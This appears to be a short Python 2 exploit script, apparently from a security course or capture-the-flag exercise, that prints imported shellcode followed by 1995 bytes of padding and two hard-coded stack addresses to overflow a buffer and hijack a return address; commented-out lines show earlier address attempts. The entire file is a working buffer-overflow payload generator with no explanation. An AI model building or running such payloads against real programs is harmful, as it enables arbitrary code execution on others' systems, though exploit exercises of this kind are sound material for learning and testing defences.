from shellcode import shellcode

#print shellcode + "\xAA"*1995 + "\xbf\xfb\xfe\xbf" + "\xa8\xf3\xfe\xbf"

#print shellcode + "\xAA"*1995 + "\xa8\xf3\xfe\xbf" + "\xbf\xfb\xfe\xbf"

print shellcode + "\xAA"*1995 + "\xa8\xf3\xfe\xbf" + "\xbc\xfb\xfe\xbf"


#from shellcode import shellcode

#print len(shellcode) #+ "\xAA"*59 + "\x4c\xfb\xfe\xbf"
